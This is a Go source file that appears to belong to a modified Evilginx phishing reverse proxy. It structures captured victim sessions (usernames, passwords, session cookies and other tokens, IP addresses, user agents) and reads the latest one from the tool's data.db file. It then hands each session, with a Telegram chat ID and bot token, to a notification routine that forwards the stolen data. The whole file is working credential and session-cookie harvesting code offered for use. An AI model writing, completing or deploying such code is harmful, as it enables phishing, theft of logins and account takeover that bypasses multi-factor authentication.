package core

import (
	"bufio"
	"encoding/json"
	"fmt"
	"os"
	"strings"
	"time"
)

type TSession struct {
	ID         int                    `json:"id"`
	Phishlet   string                 `json:"phishlet"`
	LandingURL string                 `json:"landing_url"`
	Username   string                 `json:"username"`
	Password   string                 `json:"password"`
	Custom     map[string]interface{} `json:"custom"`
	BodyTokens map[string]interface{} `json:"body_tokens"`
	HTTPTokens map[string]interface{} `json:"http_tokens"`
	Tokens     map[string]interface{} `json:"tokens"`
	SessionID  string                 `json:"session_id"`
	UserAgent  string                 `json:"useragent"`
	RemoteAddr string                 `json:"remote_addr"`
	CreateTime int64                  `json:"create_time"`
	UpdateTime int64                  `json:"update_time"`
}

// ConvertSessionToTSession converts a live Session (from http_proxy) to a TSession
// for use in Notify. This avoids reading from the data.db file which may not have
// the latest tokens yet.
func ConvertSessionToTSession(s *Session, phishlet string, landingURL string, id int) TSession {
	ts := TSession{
		ID:         id,
		Phishlet:   phishlet,
		LandingURL: landingURL,
		Username:   s.Username,
		Password:   s.Password,
		SessionID:  s.Id,
		UserAgent:  s.UserAgent,
		RemoteAddr: s.RemoteAddr,
		CreateTime: time.Now().UTC().Unix(),
		UpdateTime: time.Now().UTC().Unix(),
	}

	// Convert Custom map[string]string -> map[string]interface{}
	ts.Custom = make(map[string]interface{})
	for k, v := range s.Custom {
		ts.Custom[k] = v
	}

	// Convert BodyTokens map[string]string -> map[string]interface{}
	ts.BodyTokens = make(map[string]interface{})
	for k, v := range s.BodyTokens {
		ts.BodyTokens[k] = v
	}

	// Convert HttpTokens map[string]string -> map[string]interface{}
	ts.HTTPTokens = make(map[string]interface{})
	for k, v := range s.HttpTokens {
		ts.HTTPTokens[k] = v
	}

	// Convert CookieTokens map[string]map[string]*CookieToken -> map[string]interface{}
	// This must match the JSON structure in data.db:
	// { "domain": { "CookieName": { "Name": ..., "Value": ..., "Path": ..., "HttpOnly": ... } } }
	ts.Tokens = make(map[string]interface{})
	for domain, cookieMap := range s.CookieTokens {
		domainTokens := make(map[string]interface{})
		for cookieName, ct := range cookieMap {
			tokenData := map[string]interface{}{
				"Name":     ct.Name,
				"Value":    ct.Value,
				"Path":     ct.Path,
				"HttpOnly": ct.HttpOnly,
			}
			domainTokens[cookieName] = tokenData
		}
		ts.Tokens[domain] = domainTokens
	}

	return ts
}

// NotifyDirect builds a TSession from the live Session and calls Notify.
// This is used from http_proxy.go to avoid the stale data.db reading issue.
func NotifyDirect(s *Session, sid int, phishlet string, landingURL string, chatid string, teletoken string) {
	ts := ConvertSessionToTSession(s, phishlet, landingURL, sid)
	Notify(ts, chatid, teletoken)
}

func ReadLatestSession(filePath string) (TSession, error) {
	file, err := os.Open(filePath)
	if err != nil {
		return TSession{}, fmt.Errorf("could not open file: %v", err)
	}
	defer file.Close()

	var latestSession TSession
	var currentSessionData string
	captureSession := false

	scanner := bufio.NewScanner(file)

	for scanner.Scan() {
		line := scanner.Text()

		if strings.HasPrefix(line, "$") {
			if captureSession {
				if currentSessionData != "" {
					var session TSession
					err := json.Unmarshal([]byte(currentSessionData), &session)
					if err == nil {
						latestSession = session
					} else {
						fmt.Printf("Error parsing session JSON: %v\n", err)
					}
					currentSessionData = ""
				}
			}
			captureSession = true
		}

		if captureSession && strings.HasPrefix(line, "{") {
			currentSessionData = line
		}
	}

	if captureSession && currentSessionData != "" {
		var session TSession
		err := json.Unmarshal([]byte(currentSessionData), &session)
		if err == nil {
			latestSession = session
		} else {
			fmt.Printf("Error parsing session JSON: %v\n", err)
		}
	}

	if err := scanner.Err(); err != nil {
		return TSession{}, fmt.Errorf("error reading file: %v", err)
	}

	return latestSession, nil
}

func readFile(chatid string, teletoken string) {

	filePath := "/root/.evilginx/data.db"

	latestSession, err := ReadLatestSession(filePath)
	if err != nil {
		fmt.Printf("Error: %v\n", err)
		return
	}

	if latestSession.ID != 0 { // Assuming ID 0 indicates no valid session

		Notify(latestSession, chatid, teletoken)
	} else {
		fmt.Println("No session found.")
	}
}

